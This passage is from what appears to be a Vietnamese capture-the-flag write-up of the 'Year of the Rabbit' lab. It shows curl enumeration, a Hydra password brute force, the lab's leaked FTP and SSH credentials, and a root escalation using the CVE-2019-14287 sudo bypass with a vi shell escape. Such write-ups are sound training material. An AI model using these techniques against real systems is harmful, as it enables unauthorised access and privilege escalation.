<a id=__codelineno-2-14 name=__codelineno-2-14 href=#__codelineno-2-14></a><span class=p>&lt;</span> <span class=n>Content-Type</span><span class=p>:</span> <span class=n>text</span><span class=p>/</span><span class=n>html</span><span class=p>;</span> <span class=n>charset</span><span class=p>=</span><span class=n>UTF</span><span class=p>-</span><span class=n>8</span>
<a id=__codelineno-2-15 name=__codelineno-2-15 href=#__codelineno-2-15></a><span class=p>&lt;</span> 
<a id=__codelineno-2-16 name=__codelineno-2-16 href=#__codelineno-2-16></a><span class=p>*</span> <span class=n>Connection</span> <span class=c>#0 to host 10.10.25.94 left intact</span>
</code></pre></div> <p>Ta thấy nó có 1 folder ẩn là <code>WExYY2Cv-qU</code>. Cứ curl tiếp</p> <div class=highlight><span class=filename>Curl</span><pre><span></span><code><a id=__codelineno-3-1 name=__codelineno-3-1 href=#__codelineno-3-1></a><span class=err>└─</span><span class=p>$</span> <span class=nb>curl </span><span class=n>http</span><span class=p>://</span><span class=n>10</span><span class=p>.</span><span class=n>10</span><span class=p>.</span><span class=n>25</span><span class=p>.</span><span class=n>94</span><span class=p>/</span><span class=n>WExYY2Cv-qU</span><span class=p>/</span> <span class=n>-v</span>                    
<a id=__codelineno-3-2 name=__codelineno-3-2 href=#__codelineno-3-2></a><span class=p>*</span>   <span class=n>Trying</span> <span class=n>10</span><span class=p>.</span><span class=n>10</span><span class=p>.</span><span class=n>25</span><span class=p>.</span><span class=n>94</span><span class=p>:</span><span class=n>80</span><span class=p>...</span>
<a id=__codelineno-3-3 name=__codelineno-3-3 href=#__codelineno-3-3></a><span class=p>*</span> <span class=n>Connected</span> <span class=n>to</span> <span class=n>10</span><span class=p>.</span><span class=n>10</span><span class=p>.</span><span class=n>25</span><span class=p>.</span><span class=n>94</span> <span class=p>(</span><span class=n>10</span><span class=p>.</span><span class=n>10</span><span class=p>.</span><span class=n>25</span><span class=p>.</span><span class=n>94</span><span class=p>)</span> <span class=n>port</span> <span class=n>80</span> <span class=p>(</span><span class=c>#0)</span>
<a id=__codelineno-3-4 name=__codelineno-3-4 href=#__codelineno-3-4></a><span class=p>&gt;</span> <span class=n>GET</span> <span class=p>/</span><span class=n>WExYY2Cv-qU</span><span class=p>/</span> <span class=n>HTTP</span><span class=p>/</span><span class=n>1</span><span class=p>.</span><span class=n>1</span>
<a id=__codelineno-3-5 name=__codelineno-3-5 href=#__codelineno-3-5></a><span class=p>&gt;</span> <span class=n>Host</span><span class=p>:</span> <span class=n>10</span><span class=p>.</span><span class=n>10</span><span class=p>.</span><span class=n>25</span><span class=p>.</span><span class=n>94</span>
<a id=__codelineno-3-6 name=__codelineno-3-6 href=#__codelineno-3-6></a><span class=p>&gt;</span> <span class=n>User-Agent</span><span class=p>:</span> <span class=n>curl</span><span class=p>/</span><span class=n>7</span><span class=p>.</span><span class=n>88</span><span class=p>.</span><span class=n>1</span>
<a id=__codelineno-3-7 name=__codelineno-3-7 href=#__codelineno-3-7></a><span class=p>&gt;</span> <span class=n>Accept</span><span class=p>:</span> <span class=p>*/*</span>
<a id=__codelineno-3-8 name=__codelineno-3-8 href=#__codelineno-3-8></a><span class=p>&gt;</span> 
<a id=__codelineno-3-9 name=__codelineno-3-9 href=#__codelineno-3-9></a><span class=p>&lt;</span> <span class=n>HTTP</span><span class=p>/</span><span class=n>1</span><span class=p>.</span><span class=n>1</span> <span class=n>200</span> <span class=n>OK</span>
<a id=__codelineno-3-10 name=__codelineno-3-10 href=#__codelineno-3-10></a><span class=p>&lt;</span> <span class=n>Date</span><span class=p>:</span> <span class=n>Fri</span><span class=p>,</span> <span class=n>01</span> <span class=n>Sep</span> <span class=n>2023</span> <span class=n>16</span><span class=p>:</span><span class=n>34</span><span class=p>:</span><span class=n>27</span> <span class=n>GMT</span>
<a id=__codelineno-3-11 name=__codelineno-3-11 href=#__codelineno-3-11></a><span class=p>&lt;</span> <span class=n>Server</span><span class=p>:</span> <span class=n>Apache</span><span class=p>/</span><span class=n>2</span><span class=p>.</span><span class=n>4</span><span class=p>.</span><span class=n>10</span> <span class=p>(</span><span class=n>Debian</span><span class=p>)</span>
<a id=__codelineno-3-12 name=__codelineno-3-12 href=#__codelineno-3-12></a><span class=p>&lt;</span> <span class=n>Vary</span><span class=p>:</span> <span class=n>Accept-Encoding</span>
<a id=__codelineno-3-13 name=__codelineno-3-13 href=#__codelineno-3-13></a><span class=p>&lt;</span> <span class=n>Content-Length</span><span class=p>:</span> <span class=n>954</span>
<a id=__codelineno-3-14 name=__codelineno-3-14 href=#__codelineno-3-14></a><span class=p>&lt;</span> <span class=n>Content-Type</span><span class=p>:</span> <span class=n>text</span><span class=p>/</span><span class=n>html</span><span class=p>;</span><span class=n>charset</span><span class=p>=</span><span class=n>UTF</span><span class=p>-</span><span class=n>8</span>
<a id=__codelineno-3-15 name=__codelineno-3-15 href=#__codelineno-3-15></a><span class=p>&lt;</span> 
<a id=__codelineno-3-16 name=__codelineno-3-16 href=#__codelineno-3-16></a><span class=p>&lt;!</span><span class=n>DOCTYPE</span> <span class=n>HTML</span> <span class=n>PUBLIC</span> <span class=s2>&quot;-//W3C//DTD HTML 3.2 Final//EN&quot;</span><span class=p>&gt;</span>
<a id=__codelineno-3-17 name=__codelineno-3-17 href=#__codelineno-3-17></a><span class=p>&lt;</span><span class=n>html</span><span class=p>&gt;</span>
<a id=__codelineno-3-18 name=__codelineno-3-18 href=#__codelineno-3-18></a> <span class=p>&lt;</span><span class=n>head</span><span class=p>&gt;</span>
<a id=__codelineno-3-19 name=__codelineno-3-19 href=#__codelineno-3-19></a>  <span class=p>&lt;</span><span class=n>title</span><span class=p>&gt;</span><span class=n>Index</span> <span class=n>of</span> <span class=p>/</span><span class=n>WExYY2Cv-qU</span><span class=p>&lt;/</span><span class=n>title</span><span class=p>&gt;</span>
<a id=__codelineno-3-20 name=__codelineno-3-20 href=#__codelineno-3-20></a> <span class=p>&lt;/</span><span class=n>head</span><span class=p>&gt;</span>
<a id=__codelineno-3-21 name=__codelineno-3-21 href=#__codelineno-3-21></a> <span class=p>&lt;</span><span class=n>body</span><span class=p>&gt;</span>
<a id=__codelineno-3-22 name=__codelineno-3-22 href=#__codelineno-3-22></a><span class=p>&lt;</span><span class=n>h1</span><span class=p>&gt;</span><span class=n>Index</span> <span class=n>of</span> <span class=p>/</span><span class=n>WExYY2Cv-qU</span><span class=p>&lt;/</span><span class=n>h1</span><span class=p>&gt;</span>
<a id=__codelineno-3-23 name=__codelineno-3-23 href=#__codelineno-3-23></a>  <span class=p>&lt;</span><span class=n>table</span><span class=p>&gt;</span>
<a id=__codelineno-3-24 name=__codelineno-3-24 href=#__codelineno-3-24></a>   <span class=p>&lt;</span><span class=n>tr</span><span class=p>&gt;&lt;</span><span class=n>th</span> <span class=n>valign</span><span class=p>=</span><span class=s2>&quot;top&quot;</span><span class=p>&gt;&lt;</span><span class=n>img</span> <span class=n>src</span><span class=p>=</span><span class=s2>&quot;/icons/blank.gif&quot;</span> <span class=n>alt</span><span class=p>=</span><span class=s2>&quot;[ICO]&quot;</span><span class=p>&gt;&lt;/</span><span class=n>th</span><span class=p>&gt;&lt;</span><span class=n>th</span><span class=p>&gt;&lt;</span><span class=n>a</span> <span class=n>href</span><span class=p>=</span><span class=s2>&quot;?C=N;O=D&quot;</span><span class=p>&gt;</span><span class=n>Name</span><span class=p>&lt;/</span><span class=n>a</span><span class=p>&gt;&lt;/</span><span class=n>th</span><span class=p>&gt;&lt;</span><span class=n>th</span><span class=p>&gt;&lt;</span><span class=n>a</span> <span class=n>href</span><span class=p>=</span><span class=s2>&quot;?C=M;O=A&quot;</span><span class=p>&gt;</span><span class=n>Last</span> <span class=n>modified</span><span class=p>&lt;/</span><span class=n>a</span><span class=p>&gt;&lt;/</span><span class=n>th</span><span class=p>&gt;&lt;</span><span class=n>th</span><span class=p>&gt;&lt;</span><span class=n>a</span> <span class=n>href</span><span class=p>=</span><span class=s2>&quot;?C=S;O=A&quot;</span><span class=p>&gt;</span><span class=n>Size</span><span class=p>&lt;/</span><span class=n>a</span><span class=p>&gt;&lt;/</span><span class=n>th</span><span class=p>&gt;&lt;</span><span class=n>th</span><span class=p>&gt;&lt;</span><span class=n>a</span> <span class=n>href</span><span class=p>=</span><span class=s2>&quot;?C=D;O=A&quot;</span><span class=p>&gt;</span><span class=n>Description</span><span class=p>&lt;/</span><span class=n>a</span><span class=p>&gt;&lt;/</span><span class=n>th</span><span class=p>&gt;&lt;/</span><span class=n>tr</span><span class=p>&gt;</span>
<a id=__codelineno-3-25 name=__codelineno-3-25 href=#__codelineno-3-25></a>   <span class=p>&lt;</span><span class=n>tr</span><span class=p>&gt;&lt;</span><span class=n>th</span> <span class=n>colspan</span><span class=p>=</span><span class=s2>&quot;5&quot;</span><span class=p>&gt;&lt;</span><span class=n>hr</span><span class=p>&gt;&lt;/</span><span class=n>th</span><span class=p>&gt;&lt;/</span><span class=n>tr</span><span class=p>&gt;</span>
<a id=__codelineno-3-26 name=__codelineno-3-26 href=#__codelineno-3-26></a><span class=p>&lt;</span><span class=n>tr</span><span class=p>&gt;&lt;</span><span class=n>td</span> <span class=n>valign</span><span class=p>=</span><span class=s2>&quot;top&quot;</span><span class=p>&gt;&lt;</span><span class=n>img</span> <span class=n>src</span><span class=p>=</span><span class=s2>&quot;/icons/back.gif&quot;</span> <span class=n>alt</span><span class=p>=</span><span class=s2>&quot;[PARENTDIR]&quot;</span><span class=p>&gt;&lt;/</span><span class=n>td</span><span class=p>&gt;&lt;</span><span class=n>td</span><span class=p>&gt;&lt;</span><span class=n>a</span> <span class=n>href</span><span class=p>=</span><span class=s2>&quot;/&quot;</span><span class=p>&gt;</span><span class=n>Parent</span> <span class=n>Directory</span><span class=p>&lt;/</span><span class=n>a</span><span class=p>&gt;&lt;/</span><span class=n>td</span><span class=p>&gt;&lt;</span><span class=n>td</span><span class=p>&gt;&amp;</span><span class=n>nbsp</span><span class=p>;&lt;/</span><span class=n>td</span><span class=p>&gt;&lt;</span><span class=n>td</span> <span class=n>align</span><span class=p>=</span><span class=s2>&quot;right&quot;</span><span class=p>&gt;</span>  <span class=p>-</span> <span class=p>&lt;/</span><span class=n>td</span><span class=p>&gt;&lt;</span><span class=n>td</span><span class=p>&gt;&amp;</span><span class=n>nbsp</span><span class=p>;&lt;/</span><span class=n>td</span><span class=p>&gt;&lt;/</span><span class=n>tr</span><span class=p>&gt;</span>
<a id=__codelineno-3-27 name=__codelineno-3-27 href=#__codelineno-3-27></a><span class=p>&lt;</span><span class=n>tr</span><span class=p>&gt;&lt;</span><span class=n>td</span> <span class=n>valign</span><span class=p>=</span><span class=s2>&quot;top&quot;</span><span class=p>&gt;&lt;</span><span class=n>img</span> <span class=n>src</span><span class=p>=</span><span class=s2>&quot;/icons/image2.gif&quot;</span> <span class=n>alt</span><span class=p>=</span><span class=s2>&quot;[IMG]&quot;</span><span class=p>&gt;&lt;/</span><span class=n>td</span><span class=p>&gt;&lt;</span><span class=n>td</span><span class=p>&gt;&lt;</span><span class=n>a</span> <span class=n>href</span><span class=p>=</span><span class=s2>&quot;Hot_Babe.png&quot;</span><span class=p>&gt;</span><span class=n>Hot_Babe</span><span class=p>.</span><span class=n>png</span><span class=p>&lt;/</span><span class=n>a</span><span class=p>&gt;&lt;/</span><span class=n>td</span><span class=p>&gt;&lt;</span><span class=n>td</span> <span class=n>align</span><span class=p>=</span><span class=s2>&quot;right&quot;</span><span class=p>&gt;</span><span class=n>2020</span><span class=p>-</span><span class=n>01</span><span class=p>-</span><span class=n>23</span> <span class=n>00</span><span class=p>:</span><span class=n>34</span>  <span class=p>&lt;/</span><span class=n>td</span><span class=p>&gt;&lt;</span><span class=n>td</span> <span class=n>align</span><span class=p>=</span><span class=s2>&quot;right&quot;</span><span class=p>&gt;</span><span class=n>464K</span><span class=p>&lt;/</span><span class=n>td</span><span class=p>&gt;&lt;</span><span class=n>td</span><span class=p>&gt;&amp;</span><span class=n>nbsp</span><span class=p>;&lt;/</span><span class=n>td</span><span class=p>&gt;&lt;/</span><span class=n>tr</span><span class=p>&gt;</span>
<a id=__codelineno-3-28 name=__codelineno-3-28 href=#__codelineno-3-28></a>   <span class=p>&lt;</span><span class=n>tr</span><span class=p>&gt;&lt;</span><span class=n>th</span> <span class=n>colspan</span><span class=p>=</span><span class=s2>&quot;5&quot;</span><span class=p>&gt;&lt;</span><span class=n>hr</span><span class=p>&gt;&lt;/</span><span class=n>th</span><span class=p>&gt;&lt;/</span><span class=n>tr</span><span class=p>&gt;</span>
<a id=__codelineno-3-29 name=__codelineno-3-29 href=#__codelineno-3-29></a><span class=p>&lt;/</span><span class=n>table</span><span class=p>&gt;</span>
<a id=__codelineno-3-30 name=__codelineno-3-30 href=#__codelineno-3-30></a><span class=p>&lt;</span><span class=n>address</span><span class=p>&gt;</span><span class=n>Apache</span><span class=p>/</span><span class=n>2</span><span class=p>.</span><span class=n>4</span><span class=p>.</span><span class=n>10</span> <span class=p>(</span><span class=n>Debian</span><span class=p>)</span> <span class=n>Server</span> <span class=n>at</span> <span class=n>10</span><span class=p>.</span><span class=n>10</span><span class=p>.</span><span class=n>25</span><span class=p>.</span><span class=n>94</span> <span class=n>Port</span> <span class=n>80</span><span class=p>&lt;/</span><span class=n>address</span><span class=p>&gt;</span>
<a id=__codelineno-3-31 name=__codelineno-3-31 href=#__codelineno-3-31></a><span class=p>&lt;/</span><span class=n>body</span><span class=p>&gt;&lt;/</span><span class=n>html</span><span class=p>&gt;</span>
<a id=__codelineno-3-32 name=__codelineno-3-32 href=#__codelineno-3-32></a><span class=p>*</span> <span class=n>Connection</span> <span class=c>#0 to host 10.10.25.94 left intact</span>
</code></pre></div> <p>Ta nhận được file <code>Hot_Babe.png</code>. Được rồi ta sẽ get file về.</p> <p>Với strings, ta thấy rằng đoạn sau của file ảnh hiển thị thông tin username và password cho việc login bằng ftp</p> <p><img alt src=image-2.png></p> <p>Ta sẽ dùng hydra để brute force password</p> <p><img alt src=image-3.png></p> <details class=note> <summary>No....</summary> <p>user: ftpuser</p> <p>pass: 5iez1wGXKfPKQ</p> </details> <p>Login ftp thôi, ta sẽ được thêm 1 đoạn text mới</p> <div class=highlight><pre><span></span><code><a id=__codelineno-4-1 name=__codelineno-4-1 href=#__codelineno-4-1></a>+++++ ++++[ -&gt;+++ +++++ +&lt;]&gt;+ +++.&lt; +++++ [-&gt;++ +++&lt;] &gt;++++ +.&lt;++ +[-&gt;-
<a id=__codelineno-4-2 name=__codelineno-4-2 href=#__codelineno-4-2></a>--&lt;]&gt; ----- .&lt;+++ [-&gt;++ +&lt;]&gt;+ +++.&lt; +++++ ++[-&gt; ----- --&lt;]&gt; ----- --.&lt;+
<a id=__codelineno-4-3 name=__codelineno-4-3 href=#__codelineno-4-3></a>++++[ -&gt;--- --&lt;]&gt; -.&lt;++ +++++ +[-&gt;+ +++++ ++&lt;]&gt; +++++ .++++ +++.- --.&lt;+
<a id=__codelineno-4-4 name=__codelineno-4-4 href=#__codelineno-4-4></a>+++++ +++[- &gt;---- ----- &lt;]&gt;-- ----- ----. ---.&lt; +++++ +++[- &gt;++++ ++++&lt;
<a id=__codelineno-4-5 name=__codelineno-4-5 href=#__codelineno-4-5></a>]&gt;+++ +++.&lt; ++++[ -&gt;+++ +&lt;]&gt;+ .&lt;+++ +[-&gt;+ +++&lt;] &gt;++.. ++++. ----- ---.+
<a id=__codelineno-4-6 name=__codelineno-4-6 href=#__codelineno-4-6></a>++.&lt;+ ++[-&gt; ---&lt;] &gt;---- -.&lt;++ ++++[ -&gt;--- ---&lt;] &gt;---- --.&lt;+ ++++[ -&gt;---
<a id=__codelineno-4-7 name=__codelineno-4-7 href=#__codelineno-4-7></a>--&lt;]&gt; -.&lt;++ ++++[ -&gt;+++ +++&lt;] &gt;.&lt;++ +[-&gt;+ ++&lt;]&gt; +++++ +.&lt;++ +++[- &gt;++++
<a id=__codelineno-4-8 name=__codelineno-4-8 href=#__codelineno-4-8></a>+&lt;]&gt;+ +++.&lt; +++++ +[-&gt;- ----- &lt;]&gt;-- ----- -.&lt;++ ++++[ -&gt;+++ +++&lt;] &gt;+.&lt;+
<a id=__codelineno-4-9 name=__codelineno-4-9 href=#__codelineno-4-9></a>++++[ -&gt;--- --&lt;]&gt; ---.&lt; +++++ [-&gt;-- ---&lt;] &gt;---. &lt;++++ ++++[ -&gt;+++ +++++
<a id=__codelineno-4-10 name=__codelineno-4-10 href=#__codelineno-4-10></a>&lt;]&gt;++ ++++. &lt;++++ +++[- &gt;---- ---&lt;] &gt;---- -.+++ +.&lt;++ +++++ [-&gt;++ +++++
<a id=__codelineno-4-11 name=__codelineno-4-11 href=#__codelineno-4-11></a>&lt;]&gt;+. &lt;+++[ -&gt;--- &lt;]&gt;-- ---.- ----. &lt;
</code></pre></div> <p>Đây là thông điệp được mã hóa bằng Brainfuck. Dùng các website decode trên mạng ta được thông tin login ssh</p> <ul> <li>User: eli</li> <li>Password: DSpDiM1wAEwid</li> </ul> <h3 id=init-access><strong>Init Access</strong><a class=headerlink href=#init-access title="Permanent link">&para;</a></h3> <p>Sau khi login ssh ta thấy được hint cũng khá có ý nghĩa</p> <p> <figure><img src=image-4.png><figcaption>Hint</figcaption> </figure> </p> <p>Hint nói rằng có một file s3cr3t nào đó, tìm thông tin file bằng <code>find</code></p> <div class=highlight><pre><span></span><code><a id=__codelineno-5-1 name=__codelineno-5-1 href=#__codelineno-5-1></a><span class=n>Your</span> <span class=n>password</span> <span class=n>is</span> <span class=n>awful</span><span class=p>,</span> <span class=n>Gwendoline</span><span class=p>.</span> 
<a id=__codelineno-5-2 name=__codelineno-5-2 href=#__codelineno-5-2></a><span class=n>It</span> <span class=n>should</span> <span class=n>be</span> <span class=n>at</span> <span class=n>least</span> <span class=n>60</span> <span class=n>characters</span> <span class=n>long</span><span class=p>!</span> <span class=n>Not</span> <span class=n>just</span> <span class=n>MniVCQVhQHUNI</span>
<a id=__codelineno-5-3 name=__codelineno-5-3 href=#__codelineno-5-3></a><span class=n>Honestly</span><span class=p>!</span>
<a id=__codelineno-5-4 name=__codelineno-5-4 href=#__codelineno-5-4></a>
<a id=__codelineno-5-5 name=__codelineno-5-5 href=#__codelineno-5-5></a><span class=n>Yours</span> <span class=n>sincerely</span>
<a id=__codelineno-5-6 name=__codelineno-5-6 href=#__codelineno-5-6></a>   <span class=n>-Root</span>
</code></pre></div> <blockquote> <p>password for user gwendoline is MniVCQVhQHUNI</p> </blockquote> <p>Tiếp tục login với user gwendoline...</p> <div class=highlight><span class=filename>Sudo -l</span><pre><span></span><code><a id=__codelineno-6-1 name=__codelineno-6-1 href=#__codelineno-6-1></a><span class=n>gwendoline</span><span class=nv>@year</span><span class=n>-of-the-rabbit</span><span class=p>:~$</span> <span class=n>sudo</span> <span class=n>-l</span>
<a id=__codelineno-6-2 name=__codelineno-6-2 href=#__codelineno-6-2></a><span class=n>Matching</span> <span class=n>Defaults</span> <span class=n>entries</span> <span class=k>for</span> <span class=n>gwendoline</span> <span class=n>on</span> <span class=n>year-of-the-rabbit</span><span class=p>:</span>
<a id=__codelineno-6-3 name=__codelineno-6-3 href=#__codelineno-6-3></a>    <span class=n>env_reset</span><span class=p>,</span> <span class=n>mail_badpass</span><span class=p>,</span>
<a id=__codelineno-6-4 name=__codelineno-6-4 href=#__codelineno-6-4></a>    <span class=n>secure_path</span><span class=p>=/</span><span class=n>usr</span><span class=p>/</span><span class=n>local</span><span class=p>/</span><span class=n>sbin</span><span class=p>\:/</span><span class=n>usr</span><span class=p>/</span><span class=n>local</span><span class=p>/</span><span class=n>bin</span><span class=p>\:/</span><span class=n>usr</span><span class=p>/</span><span class=n>sbin</span><span class=p>\:/</span><span class=n>usr</span><span class=p>/</span><span class=n>bin</span><span class=p>\:/</span><span class=n>sbin</span><span class=p>\:/</span><span class=n>bin</span>
<a id=__codelineno-6-5 name=__codelineno-6-5 href=#__codelineno-6-5></a>
<a id=__codelineno-6-6 name=__codelineno-6-6 href=#__codelineno-6-6></a><span class=n>User</span> <span class=n>gwendoline</span> <span class=n>may</span> <span class=n>run</span> <span class=n>the</span> <span class=n>following</span> <span class=n>commands</span> <span class=n>on</span> <span class=n>year-of-the-rabbit</span><span class=p>:</span>
<a id=__codelineno-6-7 name=__codelineno-6-7 href=#__codelineno-6-7></a>    <span class=p>(</span><span class=n>ALL</span><span class=p>,</span> <span class=p>!</span><span class=n>root</span><span class=p>)</span> <span class=n>NOPASSWD</span><span class=p>:</span> <span class=p>/</span><span class=n>usr</span><span class=p>/</span><span class=n>bin</span><span class=p>/</span><span class=n>vi</span> <span class=p>/</span><span class=n>home</span><span class=p>/</span><span class=n>gwendoline</span><span class=p>/</span><span class=n>user</span><span class=p>.</span><span class=n>txt</span>
</code></pre></div> <p>Searchsploit ta thấy kết quả đây là CVE-2019-14287</p> <h3 id=privilege-escalation><strong>Privilege Escalation</strong><a class=headerlink href=#privilege-escalation title="Permanent link">&para;</a></h3> <p>Dựa và mô tả của CVE-2019-14287 như trên, ta dễ dàng leo quyền root</p> <blockquote> <p>sudo -u#-1 /usr/bin/vi /home/gwendoline/user.txt</p> <p>:!/bin/sh</p> </blockquote> <h2 id=what-we-learned><strong>What we learned</strong><a class=headerlink href=#what-we-learned title="Permanent link">&para;</a></h2> <ol> <li>Disable Javascript</li> <li>Brainfuck</li> <li>CVE-2019-14287</li> </ol> <hr> <div class=md-source-file> <small> Last update: <span class="git-revision-date-localized-plugin git-revision-date-localized-plugin-date">September 2, 2023</span> <br> Created: <span class="git-revision-date-localized-plugin git-revision-date-localized-plugin-date">September 2, 2023</span> </small> </div> <h2 id=__comments><strong>Comments</strong></h2> <script src=https://giscus.app/client.js data-repo=hieuhdh/hieuhdh.github.io data-repo-id=R_kgDOHowGCg data-category=General data-category-id=DIC_kwDOHowGCs4CQLlU data-mapping=pathname data-reactions-enabled=1 data-emit-metadata=1 data-theme=preferred_color_scheme data-lang=en crossorigin=anonymous async></script> <script>
  var theme, giscus = document.querySelector("script[src*=giscus]"),
    palette = __md_get("__palette");
  palette && "object" == typeof palette.color && (theme = "slate" === palette.color.scheme ? "dark" : "light", giscus
    .setAttribute("data-theme", theme)), document.addEventListener("DOMContentLoaded", function () {
    document.querySelector("[data-md-component=palette]").addEventListener("change", function () {
      var e = __md_get("__palette");
      e && "object" == typeof e.color && (e = "slate" === e.color.scheme ? "dark" : "light", document
        .querySelector(".giscus-frame").contentWindow.postMessage({
          giscus: {
            setConfig: {
              theme: e
            }
          }
        }, "https://giscus.app"))
    })
  })

</script> </article> </div> </div> <a href=# class="md-top md-icon" data-md-component=top hidden> <svg xmlns=http://www.w3.org/2000/svg viewbox="0 0 24 24"><path d="M13 20h-2V8l-5.5 5.5-1.42-1.42L12 4.16l7.92 7.92-1.42 1.42L13 8v12Z"/></svg> Back to top </a> </main> <footer class=md-footer> <div class="md-footer-meta md-typeset"> <div class="md-footer-meta__inner md-grid"> <div class=md-copyright> <div class=md-copyright__highlight> Copyright &copy; 2023 0x5h1n0k0 </div> Made with <a href=https://squidfunk.github.io/mkdocs-material/ target=_blank rel=noopener> Material for MkDocs </a> </div> </div> </div> </footer> </div> <div class=md-dialog data-md-component=dialog> <div class="md-dialog__inner md-typeset"></div> </div> <script id=__config type=application/json>{"base": "../../..", "features": ["content.code.annotate", "content.tooltips", "navigation.sections", "navigation.top", "navigation.tracking", "search.highlight", "search.share", "search.suggest", "toc.follow"], "search": "../../../assets/javascripts/workers/search.b97dbffb.min.js", "translations": {"clipboard.copied": "Copied to clipboard", "clipboard.copy": "Copy to clipboard", "search.config.lang": "en", "search.config.pipeline": "trimmer, stopWordFilter", "search.config.separator": "[\\s\\-]+", "search.placeholder": "Search", "search.result.more.one": "1 more on this page", "search.result.more.other": "# more on this page", "search.result.none": "No matching documents", "search.result.one": "1 matching document", "search.result.other": "# matching documents", "search.result.placeholder": "Type to start searching", "search.result.term.missing": "Missing", "select.version.title": "Select version"}}</script> <script src=../../../assets/javascripts/bundle.6c7ad80a.min.js></script> <script src=../../../assets/javascripts/cursor-effects.js></script> <!-- get ip
        <script src="https://unpkg.com/axios/dist/axios.min.js"></script>
        <script>
            function taskService() {
                this.postListApi = function () {
                    return axios({
                        url: "https://api.ipify.org?format=json",
                        method: "GET",
                    });
                };
            }
            var TaskList = new taskService();

            TaskList.postListApi()
                .then(function (result) {

                    function taskService02() {
                        this.getListApiii = function () {
                            return axios({
                                url: "https://bedeu.herokuapp.com/iphomeposts/views/",
                                method: "POST",
                                data: {
                                    "ip": result.data.ip,
                                },
                            });
                        };
                    }
                    var TaskListList = new taskService02();

                    TaskListList.getListApiii()
                        .then(function (result) {
                            if (result.data.sl > 1) {
                                document.getElementById("view-user").innerHTML = result.data.sl + " times"
                            } else {
                                document.getElementById("view-user").innerHTML = result.data.sl + " time"
                            }
                        })
                        .catch(function (erro) {
                            console.log(erro)
                        });
                        
                    function taskService01() {
                        this.getListApii = function () {
                            return axios({
                                url: "https://bedeu.herokuapp.com/iphomeposts/views_total/",
                                method: "GET",
                            });
                        };
                    }
                    var TaskListt = new taskService01();

                    TaskListt.getListApii()
                        .then(function (result) {
                            document.getElementById("view-all").innerHTML = result.data
                        })
                        .catch(function (erro) {
                            console.log(erro)
                        });
                })
                .catch(function (erro) {});

        </script>

        <script>
            function taskServicePost() {
                this.postListApiTotal = function () {
                    return axios({
                        url: "https://api.ipify.org?format=json",
                        method: "GET",
                    });
                };
            }
            var TaskList = new taskServicePost();
            var arr = window.location.pathname.split('/');


            TaskList.postListApiTotal()
                .then(function (result) {

                    function taskServicePost02() {
                        this.getListApiUser = function () {
                            return axios({
                                url: "https://bedeu.herokuapp.com/ipposts/views/",
                                method: "POST",
                                data: {
                                    "ip": result.data.ip,
                                    "post": arr[arr.length - 2],
                                },
                            });
                        };
                    }
                    var TaskListUser = new taskServicePost02();

                    TaskListUser.getListApiUser()
                        .then(function (result) {
                            if (result.data.sl > 1) {
                                document.getElementById("view-post-user").innerHTML = result.data.sl + " times";
                            } else {
                                document.getElementById("view-post-user").innerHTML = result.data.sl + " time";
                            }
                        })
                        .catch(function (erro) {
                            console.log(erro)
                        });

                        function taskServicePost01() {
                        this.getListApiTotal = function () {
                            return axios({
                                url: "https://bedeu.herokuapp.com/ipposts/views_total/",
                                method: "POST",
                                data: {
                                    "post": arr[arr.length - 2],
                                },
                            });
                        };
                    }
                    var TaskListTotal = new taskServicePost01();

                    TaskListTotal.getListApiTotal()
                        .then(function (result) {
                            if (result.data > 1) {
                                document.getElementById("view-post-all").innerHTML = result.data + " times";
                            } else {
                                document.getElementById("view-post-all").innerHTML = result.data + " time";
                            }
                        })
                        .catch(function (erro) {
                            console.log(erro)
                        });
                })
                .catch(function (erro) {});

        </script> --> <script src=../../../javascripts/consent.js></script> <script src=../../../javascripts/mathjax.js></script> <script src="https://polyfill.io/v3/polyfill.min.js?features=es6"></script> <script src=https://cdn.jsdelivr.net/npm/mathjax@3/es5/tex-mml-chtml.js></script> <script src=https://unpkg.com/tablesort@5.3.0/dist/tablesort.min.js></script> <script src=../../../javascripts/tablesort.js></script> <script src=../../../overrides/assets/javascripts/bundle.ed7d8744.min.js></script> <script src=../../../overrides/assets/javascripts/cursor-effects.js></script> <!-- <script src="../../../assets/javascripts/cursor-effects.js"></script> --> </body> </html>